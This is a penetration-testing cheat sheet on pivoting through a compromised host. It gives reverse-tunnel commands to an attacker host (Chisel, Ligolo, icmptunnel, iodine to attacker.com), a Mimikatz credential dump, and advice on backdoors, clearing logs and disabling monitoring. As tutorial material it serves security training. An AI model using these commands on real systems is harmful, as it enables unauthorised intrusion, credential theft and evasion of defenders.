# Pivoting in Penetration Testing

## Introduction
Pivoting is a powerful technique in penetration testing that allows an attacker to move deeper into a target network. Mastering tools like SSH, Chisel, Ligolo, Metasploit, and ProxyChains enables penetration testers to navigate restricted environments effectively. This enables lateral movement within an organization’s internal infrastructure. By leveraging pivoting, attackers can bypass security controls like firewalls and access sensitive internal resources. 

## Table of Contents
- [Types of Pivoting](#types-of-pivoting)
- [Pre Pivot](#pre-pivot)
  - [Compromise an Initial Host](#compromise-an-initial-host)
  - [Identify Network Interfaces](#identify-network-interfaces)
  - [Enumerate Internal Network](#enumerate-internal-network)
- [Pivoting](#pivoting)
  - [SSH Pivoting (Dynamic and Local Port Forwarding)](#ssh-pivoting-dynamic-and-local-port-forwarding)
  - [SSHuttle Pivoting](#sshuttle-pivoting)
  - [Ligolo (Auto Route Creation)](#ligolo-auto-route-creation)
  - [Chisel (Fast TCP/UDP Tunneling)](#chisel-fast-tcpudp-tunneling)
  - [Metasploit Pivoting](#metasploit-pivoting)
  - [Plink (PuTTY Link) Pivoting](#plink-putty-link-pivoting)
  - [RDP Pivoting](#rdp-pivoting)
  - [ICMP Tunneling](#icmp-tunneling)
  - [DNS Tunneling](#dns-tunneling)
- [Post Pivoting](#post-pivoting)
  - [Routing Traffic Through Compromised Host](#routing-traffic-through-compromised-host)
  - [Exploit Further and Move Laterally](#exploit-further-and-move-laterally)
  - [Maintain Access and Cover Tracks](#maintain-access-and-cover-tracks)

--- 
## Types of Pivoting
- **Network Pivoting** - Routing traffic through a compromised system to access internal networks.
- **Port Forwarding** - Exposing services from an internal machine to the attacker's machine.
- **VPN Pivoting** - Creating a VPN connection to route all traffic through the compromised host.
- **SOCKS Proxy Pivoting** - Using a SOCKS proxy to tunnel traffic through a compromised host.
- **Metasploit Pivoting** - Utilizing Metasploit's autoroute and SOCKS modules.
- **Plink (PuTTY Link) Pivoting** - Using Plink for SSH tunneling.
- **SSHuttle Pivoting** - Transparently routing traffic through an SSH connection.
- **RDP Pivoting** - Using Remote Desktop Protocol (RDP) to access internal machines.
- **ICMP Tunneling** - Encapsulating data within ICMP packets.
- **DNS Tunneling** - Exfiltrating or tunneling data over DNS queries.

--- 
# Pre Pivot 
- ## Compromise an Initial Host
  - Gain access to an external system using exploits, phishing, or credentials.
  - Obtain a shell or remote desktop access.
- ## Identify Network Interfaces
  - Check available interfaces and network connections:
    ```bash
    ip a
    ip route
    ifconfig
    netstat -rn
    ```
  Identify internal IP ranges that may indicate private networks.

- ## Enumerate Internal Network
  - Scan internal subnets using: `nmap -sP 10.10.0.0/24`
  - Check for active services: `nmap -sV -p 80,443,3389,445 10.10.0.10`
  - Extract credentials if possible (e.g., from memory dumps or configuration files).
--- 
# Pivoting
  - ## SSH Pivoting (Dynamic and Local Port Forwarding)
      - Improper pivot as some of the reuest will not work.
      - Create a SOCKS proxy to route traffic: `ssh -D 1080 -N user@compromised-host`
      - Use local port forwarding to expose internal services: `ssh -L 8080:10.10.0.10:80 user@compromised-host`
      - Then use ProxyChains
          - Modify /etc/proxychains.conf to use SOCKS5 proxy: `socks5 127.0.0.1 1080`
          - Run tools through ProxyChains: `proxychains nmap -sT 10.10.0.0/24` 
  - ## SSHuttle Pivoting
      - Improper pivot as some of the reuest will not work.
      - `sshuttle -r privilege@192.168.80.10 192.168.98.0/24`
      - Explained `sshuttle -r user@target internal_ip/24`.
  - ## Ligolo (Auto Route Creation)
      - Setup network configuration
        ```bash
            ip tuntap add user root mode tun ligolo
            ip link set ligolo up
        ```
      - On attacker's machine: `./ligolo -reverse -listen :9090`
      - On compromised machine: `./ligolo -connect attacker-ip:9090`
      - Type on proxy
        ```bash
        session
        start
        ifconfig
        ```
      - Configure Internal IP with proper IP (Replace given IP with targets internal ip)
         ```bash
         ip route add 192.168.148.0/24 dev ligolo
         ip route list
         ```
  - ## Chisel (Fast TCP/UDP Tunneling)
      - On the attacker's machine (server): `./chisel server -p 8080 --reverse`
      - On the compromised machine (client): `./chisel client 192.168.1.100:8080 R:1080:socks`
      - Then use ProxyChains
          - Modify /etc/proxychains.conf to use SOCKS5 proxy: `socks5 127.0.0.1 1080`
          - Run tools through ProxyChains: `proxychains nmap -sT 10.10.0.0/24` 
        
  - ## Metasploit Pivoting
      - Use autoroute to add routes through the compromised system: `run autoroute -s 10.10.0.0/24`
      - Use socks4a module to enable ProxyChains:
        ```bash
        use auxiliary/server/socks4a
        set SRVPORT 1080
        exploit
        ```
  - ## Plink (PuTTY Link) Pivoting
      - Windows-based SSH tunneling: `plink.exe -D 1080 -N user@compromised-host`
  - ## RDP Pivoting
      - Use RDP to connect to internal machines: `xfreerdp /u:user /p:password /v:10.10.0.10`
  - ## ICMP Tunneling
      - Use tools like icmptunnel to route traffic over ICMP: `./icmptunnel -s attacker-ip`
  - ## DNS Tunneling
      - Use iodine to tunnel traffic over DNS: `iodine -f -P password -r attacker.com`

---
# Post Pivoting
- ## Routing Traffic Through Compromised Host
  - Use Metasploit’s autoroute to configure routes: `run autoroute -s 10.10.0.0/24`
  - Scan the internal network from Metasploit: `run post/multi/manage/autoroute`

- ## Exploit Further and Move Laterally
  - Use credentials to access other machines (Pass-the-Hash, RDP, SMB, etc.).
  - Dump credentials using Mimikatz:
    ```bash
    mimikatz.exe
    sekurlsa::logonpasswords
    ```
  - Use SMB relay attacks to gain further access.

- ## Maintain Access and Cover Tracks
  - Set up persistent backdoors (e.g., SSH keys, scheduled tasks).
  - Clear logs and disable security monitoring where possible.
